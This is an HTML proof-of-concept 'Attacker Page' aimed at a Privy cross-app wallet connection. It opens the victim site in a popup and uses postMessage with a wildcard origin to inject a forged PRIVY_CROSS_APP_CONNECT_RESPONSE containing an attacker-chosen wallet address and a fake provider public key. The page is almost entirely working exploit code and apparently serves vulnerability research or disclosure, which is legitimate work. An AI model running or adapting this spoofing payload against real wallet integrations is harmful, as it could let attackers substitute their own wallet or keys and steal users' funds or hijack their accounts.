<!doctype html>
<html>
  <head>
    <title>Attacker Page</title>
  </head>
  <body style="font-family: monospace; padding: 20px">
    <h2>Attacker Page</h2>

    <input
      id="victim-url"
      value="https://poc-privy.vercel.app"
      style="width: 300px"
    />
    <br /><br />
    <button id="btn-open">Open Victim Page</button>
    <button id="btn-spoof">Inject Fake Wallet</button>
    <pre id="log"></pre>

    <script>
      var log = document.getElementById("log");
      function print(msg) {
        log.textContent += msg + "\n";
      }
      var victim = null;

      document.getElementById("btn-open").onclick = function () {
        var url = document.getElementById("victim-url").value;
        victim = window.open(url, "victim", "width=700,height=600");
        print("Opened victim at " + url);
      };

      document.getElementById("btn-spoof").onclick = function () {
        if (!victim) {
          print("open victim");
          return;
        }

        var payload = {
          type: "PRIVY_CROSS_APP_CONNECT_RESPONSE",
          address: "0xDEAD000000000000000000000000000000000000",
          providerPublicKey: btoa("attacker-fake-public-key-bytes"),
          exp: Date.now() + 14 * 24 * 60 * 60 * 1000,
        };

        victim.postMessage(payload, "*");
        print("sent PRIVY_CROSS_APP_CONNECT_RESPONSE");
        print("  address: " + payload.address);
        print("  from origin: " + location.origin);
      };
    </script>
  </body>
</html>
